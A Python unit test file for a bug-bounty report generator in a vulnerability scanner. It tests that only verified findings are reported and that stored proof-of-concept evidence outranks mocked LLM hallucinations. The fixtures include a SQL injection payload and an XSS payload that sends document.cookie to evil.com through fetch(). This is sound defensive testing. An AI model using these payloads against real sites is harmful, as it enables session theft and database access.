import unittest
from unittest.mock import AsyncMock, patch

from backend.core.check_registry import BaseCheck, CheckCategory, CheckContract, Severity, registry
from backend.models.database import Finding
from backend.models.schemas import BugBountyFindingDTO, BugBountyPoCDTO
from backend.services.bug_bounty_generator import BugBountyReportGenerator


class MockSettings:
    claude_timeout = 10
    claude_model = "claude-3-haiku-20240307"


class TestBugBountyGenerator(unittest.IsolatedAsyncioTestCase):
    def setUp(self):
        # Register a test check if not already present
        if "C999_Test_Vuln" not in registry._checks:
            class C999TestVuln(BaseCheck):
                contract = CheckContract(
                    id="C999_Test_Vuln",
                    name="Test Vulnerability Name",
                    category=CheckCategory.INJECTION,
                    description="Canonical test vulnerability description",
                    severity=Severity.HIGH,
                    vulnerability_type="SQL Injection",
                    cwe="CWE-89",
                    owasp_category="A03:2021-Injection",
                    remediation_guidance="Use parameterized queries.",
                    references=["https://owasp.org/Top10/A03_2021-Injection/"],
                )

                async def execute(self, target_url, config):
                    return None

            registry.register(C999TestVuln)

    def tearDown(self):
        registry._checks.pop("C999_Test_Vuln", None)

    async def test_only_verified_findings_appear(self):
        """Verify only findings with verdict='Verified' and false_positive=False are processed."""
        generator = BugBountyReportGenerator(api_key=None, settings=MockSettings())

        f_verified = Finding(
            id="v1",
            title="Verified Finding",
            category="injection",
            vuln_type="C999_Test_Vuln",
            severity="critical",
            confidence=95,
            verdict="Verified",
            false_positive=False,
            affected_url="https://example.com/api/v1",
        )
        f_potential = Finding(
            id="v2",
            title="Potential Finding",
            category="misconfig",
            vuln_type="C002_Missing_Security_Headers",
            severity="low",
            confidence=60,
            verdict="Potential",
            false_positive=False,
            affected_url="https://example.com/api/v2",
        )
        f_fp = Finding(
            id="v3",
            title="False Positive Finding",
            category="recon",
            vuln_type="C001_Open_Port_80",
            severity="info",
            confidence=90,
            verdict="Verified",
            false_positive=True,
            affected_url="https://example.com/api/v3",
        )
        f_inconclusive = Finding(
            id="v4",
            title="Inconclusive Finding",
            category="auth",
            vuln_type="C999_Test_Vuln",
            severity="medium",
            confidence=40,
            verdict="Inconclusive",
            false_positive=False,
            affected_url="https://example.com/api/v4",
        )

        dtos = await generator.generate_for_findings([f_verified, f_potential, f_fp, f_inconclusive])
        self.assertEqual(len(dtos), 1)
        self.assertEqual(dtos[0].title, "Verified Finding")

    async def test_deterministic_poc_override_and_registry_metadata(self):
        """Verify PoC request/response/payload and Check Registry metadata cannot be overridden by LLM."""
        generator = BugBountyReportGenerator(api_key="mock_key", settings=MockSettings())

        finding = Finding(
            id="test-123",
            title="SQL Injection",
            category="injection",
            vuln_type="C999_Test_Vuln",
            severity="critical",
            confidence=100,
            verdict="Verified",
            false_positive=False,
            affected_url="http://target.com/vuln",
            affected_param="id",
            payload="' OR 1=1 --",
            proof_request="GET /vuln?id=' OR 1=1 -- HTTP/1.1\nHost: target.com",
            proof_response="HTTP/1.1 200 OK\n\nAdmin data here",
        )

        # Mock LLM attempting to hallucinate fake requests, payloads, and CVEs
        mock_llm_output = {
            "summary": "LLM generated summary",
            "steps_to_reproduce": ["1. Open target", "2. Submit payload"],
            "impact_confirmed": "Database credentials leaked",
            "impact_potential": "Full server compromise",
            "proof_of_concept_description": "Exploit explanation",
            "suggested_fix": "Use prepared statements",
            "request": "FAKE HALLUCINATED HTTP REQUEST",
            "response": "FAKE HALLUCINATED HTTP RESPONSE",
            "payload": "FAKE HALLUCINATED PAYLOAD",
            "vulnerability_type": "HALLUCINATED_TYPE",
            "cwe": "CWE-9999",
            "owasp_category": "A99:2099-Hallucination",
        }

        with patch.object(generator, "_call_llm_enrichment", new=AsyncMock(return_value=mock_llm_output)):
            dtos = await generator.generate_for_findings([finding])

        self.assertEqual(len(dtos), 1)
        dto = dtos[0]

        # 1. PoC evidence must match DB evidence, not LLM hallucination
        self.assertEqual(dto.proof_of_concept.payload, "' OR 1=1 --")
        self.assertEqual(dto.proof_of_concept.request, "GET /vuln?id=' OR 1=1 -- HTTP/1.1\nHost: target.com")
        self.assertEqual(dto.proof_of_concept.response, "HTTP/1.1 200 OK\n\nAdmin data here")

        # 2. Canonical Check Registry metadata cannot be overridden
        self.assertEqual(dto.vulnerability_type, "SQL Injection")
        self.assertEqual(dto.cwe, "CWE-89")
        self.assertEqual(dto.owasp_category, "A03:2021-Injection")
        self.assertEqual(dto.references, ["https://owasp.org/Top10/A03_2021-Injection/"])

    async def test_missing_evidence_defaults(self):
        """Verify missing evidence does not produce fabricated or generic placeholder strings."""
        generator = BugBountyReportGenerator(api_key=None, settings=MockSettings())

        finding = Finding(
            id="test-missing",
            title="Passive Header Issue",
            category="misconfig",
            vuln_type="C002_Missing_Security_Headers",
            severity="low",
            confidence=80,
            verdict="Verified",
            false_positive=False,
            affected_url="https://target.com/page",
            payload=None,
            proof_request=None,
            proof_response=None,
        )

        dtos = await generator.generate_for_findings([finding])
        self.assertEqual(len(dtos), 1)
        dto = dtos[0]

        # Phase 18 Zero-Fabrication guarantee: No "Not available from collected evidence." string allowed
        self.assertNotIn("Not available from collected evidence.", str(dto.model_dump()))
        self.assertIn("target.com", dto.affected_url)
        self.assertIn("target.com", dto.impact_confirmed)

    async def test_reproduction_steps_cannot_be_hallucinated(self):
        """Verify reproduction steps fallback properly when LLM enrichment is not available."""
        generator = BugBountyReportGenerator(api_key=None, settings=MockSettings())

        finding = Finding(
            id="test-steps",
            title="Open Port 80",
            category="recon",
            vuln_type="C001_Open_Port_80",
            severity="info",
            confidence=100,
            verdict="Verified",
            false_positive=False,
            affected_url="http://target.com",
        )

        dtos = await generator.generate_for_findings([finding])
        self.assertEqual(len(dtos), 1)
        dto = dtos[0]
        self.assertTrue(len(dto.steps_to_reproduce) >= 1)
        self.assertNotIn("Not available from collected evidence.", dto.steps_to_reproduce[0])

    async def test_malicious_html_javascript_inside_evidence(self):
        """Verify malicious HTML/JavaScript payloads and requests are preserved verbatim without corruption."""
        generator = BugBountyReportGenerator(api_key=None, settings=MockSettings())

        malicious_payload = '<script>alert("XSS")</script><img src=x onerror=fetch("http://evil.com/steal?c="+document.cookie)>'
        malicious_request = 'POST /search HTTP/1.1\nHost: target.com\n\n<svg/onload=alert(1)>'
        malicious_response = 'HTTP/1.1 200 OK\n\n<div><script>alert("pwnd")</script></div>'

        finding = Finding(
            id="test-xss",
            title="Reflected XSS",
            category="xss",
            vuln_type="C999_Test_Vuln",
            severity="high",
            confidence=95,
            verdict="Verified",
            false_positive=False,
            affected_url="https://target.com/search?q=" + malicious_payload,
            payload=malicious_payload,
            proof_request=malicious_request,
            proof_response=malicious_response,
        )

        dtos = await generator.generate_for_findings([finding])
        self.assertEqual(len(dtos), 1)
        dto = dtos[0]

        # Ensure strings are preserved without mutation
        self.assertEqual(dto.proof_of_concept.payload, malicious_payload)
        self.assertEqual(dto.proof_of_concept.request, malicious_request)
        self.assertEqual(dto.proof_of_concept.response, malicious_response)


if __name__ == "__main__":
    unittest.main()

